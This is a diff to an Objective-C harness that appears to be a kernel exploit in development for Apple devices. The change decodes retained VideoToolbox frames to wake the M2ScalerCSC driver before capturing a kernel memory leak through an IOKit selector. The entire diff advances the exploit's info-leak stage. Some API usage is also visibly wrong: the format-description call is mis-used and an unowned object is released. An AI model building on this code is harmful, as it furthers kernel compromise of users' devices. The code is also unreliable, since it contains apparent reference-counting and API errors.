@@ -107,7 +107,7 @@ static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMS
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v3.0-wakeleak"
+#define P110_BUILD      @"p110-swapclaim-v3.2-decodearm"
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
 #define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
@@ -302,7 +302,17 @@ static void p110_pin(void) {
 }
 
 /* ---- (b) in-process Family-B catch: async-signal-safe honest verdict --- */
-static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMSampleBufferRef sb) { (void)r; (void)e; (void)st; (void)f; (void)sb; }
+static CMSampleBufferRef g_p110_wakeSb[3] = {0};
+static int g_p110_wakeSbN = 0;
+static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMSampleBufferRef sb) {
+    (void)r; (void)e; (void)st; (void)f; (void)sb;
+    /* v3.1: RETAIN the compressor's output so the DECOMPRESSION render
+       (the M2Scaler CSC stage) has real samples to decode. */
+    if (sb && g_p110_wakeSbN < 3) {
+        CFRetain(sb);
+        g_p110_wakeSb[g_p110_wakeSbN++] = sb;
+    }
+}
 
 static void p110_sigfault(int sig, siginfo_t *si, void *ctx) {
     /* A kernel-side autda death never reaches us (device reboots); this
@@ -637,7 +647,40 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                 VTCompressionSessionInvalidate(ws);
                 CFRelease(ws);
             }
-            Lf(@"[leak] wake battery: %s — recapture sel-8 now", woke ? "FIRED (encode st=0)" : "no clean encode (honest)");
+            /* v3.2 THE DECODE ARM: the compressor's output samples feed a
+               VTDecompressionSession — the decode render stage runs the
+               M2ScalerCSCDriver (the sel-8 engine's owner). The encode woke
+               AVE2 (the wrong engine, measured); the decode wakes the CSC. */
+            int dec = 0;
+            if (g_p110_wakeSbN > 0) {
+                CMVideoFormatDescriptionRef fd = NULL;
+                if (g_p110_wakeSb[0] &&
+                    CMSampleBufferGetFormatDescription(g_p110_wakeSb[0], &fd) == 0 && fd) {
+                    VTDecompressionSessionRef ds = NULL;
+                    VTDecompressionOutputCallbackRecord ocb = { .decompressionOutputCallback = NULL };
+                    OSStatus dst = VTDecompressionSessionCreate(
+                        kCFAllocatorDefault, fd, NULL,
+                        (__bridge CFDictionaryRef)@{(__bridge NSString *)kVTDecompressionPropertyKey_destinationPixelBufferAttributes:
+                            @{(__bridge NSString *)kCVPixelBufferWidthKey: @1280,
+                              (__bridge NSString *)kCVPixelBufferHeightKey: @720}},
+                        &ocb, &ds);
+                    if (dst == noErr && ds) {
+                        for (int wi = 0; wi < g_p110_wakeSbN; wi++) {
+                            VTDecodeInfoFlags dflags = 0;
+                            OSStatus dkr = VTDecompressionSessionDecodeFrame(
+                                ds, g_p110_wakeSb[wi], dflags, NULL);
+                            if (dkr == noErr) dec++;
+                        }
+                        VTDecompressionSessionWaitForAsynchronousFrames(ds);
+                        VTDecompressionSessionInvalidate(ds);
+                        CFRelease(ds);
+                    }
+                    CFRelease(fd);
+                }
+            }
+            for (int wi = 0; wi < g_p110_wakeSbN; wi++) CFRelease(g_p110_wakeSb[wi]);
+            g_p110_wakeSbN = 0;
+            Lf(@"[leak] DECODE-ARM: %d/3 frames decoded through the CSC render stage — recapture sel-8 now", dec);
             in64 = (uint64_t)(uintptr_t)g_p110_leak_out;
             memset(g_p110_leak_out, 0, sizeof(g_p110_leak_out));
             outLen = sizeof(g_p110_leak_out);
